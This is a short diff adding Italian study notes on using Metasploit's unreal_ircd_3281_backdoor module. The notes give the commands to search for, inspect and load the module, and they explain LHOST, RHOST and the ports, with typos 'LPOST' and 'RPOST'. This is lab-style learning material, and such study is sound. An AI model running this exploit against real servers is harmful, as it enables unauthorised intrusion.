@@ -615,9 +615,30 @@ nel mio caso sapendo che il servizio è unreal ...cerco unreal
 
 search unreal
 
+per avere info utilizzare :
+
+info exploit/unix/irc/unreal_ircd_3281_backdoor
+
+per usare l'exploit :
+
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+
+passaggio successivo consiste nel fare il set dell'exploit :
+
+
+show options.
+
+
+IN GENERALE :
+
+LHOST : lOCAL HOST
+RHOST : REMOTE HOST 
+LPOST : PORTA LOCALE IN KALI
+RPOST : PORTA REMOTA DA ATTACCARE.
 
 
 
+________________________________
 
 
 
